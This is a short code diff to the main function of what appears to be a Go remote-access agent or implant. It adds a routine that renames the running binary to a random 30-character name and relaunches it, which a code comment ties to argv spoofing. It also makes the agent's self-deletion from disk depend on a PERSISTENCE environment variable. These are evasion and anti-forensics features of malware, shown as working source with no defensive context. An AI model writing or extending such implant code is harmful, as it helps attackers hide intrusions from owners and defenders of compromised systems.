@@ -52,6 +52,14 @@ func main() {
 		return
 	}
 
+	// rename to make room for argv spoofing
+	if len(util.FileBaseName(os.Args[0])) < 30 {
+		new_name := util.RandStr(30)
+		os.Rename(os.Args[0], new_name)
+		exec.Command("./" + new_name).Start()
+		os.Exit(0)
+	}
+
 	if !runElvsh {
 		// always daemonize unless verbose is specified
 		run_as_daemon := !*verbose &&
@@ -106,9 +114,11 @@ func main() {
 	}
 
 	// self delete
-	err = os.Remove(self_path)
-	if err != nil {
-		log.Printf("Error removing agent file from disk: %v", err)
+	if os.Getenv("PERSISTENCE") != "true" {
+		err = os.Remove(self_path)
+		if err != nil {
+			log.Printf("Error removing agent file from disk: %v", err)
+		}
 	}
 
 	// applyRuntimeConfig
